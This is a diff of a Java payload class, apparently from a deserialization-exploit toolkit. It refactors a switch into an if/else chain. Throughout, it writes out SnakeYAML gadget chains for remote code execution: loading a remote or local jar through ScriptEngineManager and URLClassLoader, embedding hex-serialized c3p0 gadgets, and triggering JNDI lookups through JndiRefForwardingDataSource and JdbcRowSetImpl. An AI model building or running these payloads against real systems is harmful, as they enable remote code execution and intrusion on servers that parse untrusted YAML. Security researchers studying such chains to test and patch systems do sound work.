@@ -14,10 +14,9 @@ import javax.naming.Referenceable;
 import javax.naming.StringRefAddr;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
@@ -72,50 +71,45 @@ public class C3P04 implements ObjectPayload<Object> {
 
 			String yaml = "";
 
-			switch (type) {
-				case "remoteJar":
-					yaml = "!!javax.script.ScriptEngineManager [\n" +
-							"  !!java.net.URLClassLoader [[\n" +
-							"    !!java.net.URL [\"" + cmd + "\"]\n" +
-							"  ]]\n" +
-							"]";
-					break;
-				case "localJar":
-					yaml = "!!javax.script.ScriptEngineManager [\n" +
-							"  !!java.net.URLClassLoader [[\n" +
-							"    !!java.net.URL [\"file://" + cmd + "\"]\n" +
-							"  ]]\n" +
-							"]";
-					break;
-				case "writeJar":
-					String[] parts = cmd.split(":");
-					try {
-						yaml = SnakeYamlUtils.createPoC(parts[0], parts[1]);
-					} catch (Exception e) {
-						throw new RuntimeException(e);
-					}
-					break;
-				case "c3p0Double":
-					try {
-						byte[] data      = HexUtils.toByteArray(Files.newInputStream(Paths.get(cmd)));
-						String hexString = HexUtils.bytesToHexString(data, data.length);
-						yaml = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
-								"userOverridesAsString: HexAsciiSerializedMap:" + hexString + ";";
-					} catch (IOException e) {
-						throw new RuntimeException(e);
-					}
-					break;
-				case "c3p0Jndi":
-					yaml = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
-							"jndiName: " + cmd + "\n" +
-							"loginTimeout: 0";
-					break;
-				case "jndi":
-					yaml = "!!com.sun.rowset.JdbcRowSetImpl\n" +
-							"dataSourceName: " + cmd + "\n" +
-							"autoCommit: true";
-					break;
 
+			if ("remoteJar".equals(type)) {
+				yaml = "!!javax.script.ScriptEngineManager [\n" +
+						"  !!java.net.URLClassLoader [[\n" +
+						"    !!java.net.URL [\"" + cmd + "\"]\n" +
+						"  ]]\n" +
+						"]";
+			} else if ("localJar".equals(type)) {
+				yaml = "!!javax.script.ScriptEngineManager [\n" +
+						"  !!java.net.URLClassLoader [[\n" +
+						"    !!java.net.URL [\"file://" + cmd + "\"]\n" +
+						"  ]]\n" +
+						"]";
+			} else if ("writeJar".equals(type)) {
+
+				String[] parts = cmd.split(":");
+				try {
+					yaml = SnakeYamlUtils.createPoC(parts[0], parts[1]);
+				} catch (Exception e) {
+					throw new RuntimeException(e);
+				}
+			} else if ("c3p0Double".equals(type)) {
+				try {
+					byte[] data      = HexUtils.toByteArray(new FileInputStream(cmd));
+					String hexString = HexUtils.bytesToHexString(data, data.length);
+					yaml = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
+							"userOverridesAsString: HexAsciiSerializedMap:" + hexString + ";";
+				} catch (IOException e) {
+					throw new RuntimeException(e);
+				}
+			} else if ("c3p0Jndi".equals(type)) {
+				yaml = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
+						"jndiName: " + cmd + "\n" +
+						"loginTimeout: 0";
+
+			} else if ("jndi".equals(type)) {
+				yaml = "!!com.sun.rowset.JdbcRowSetImpl\n" +
+						"dataSourceName: " + cmd + "\n" +
+						"autoCommit: true";
 			}
 
 			ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
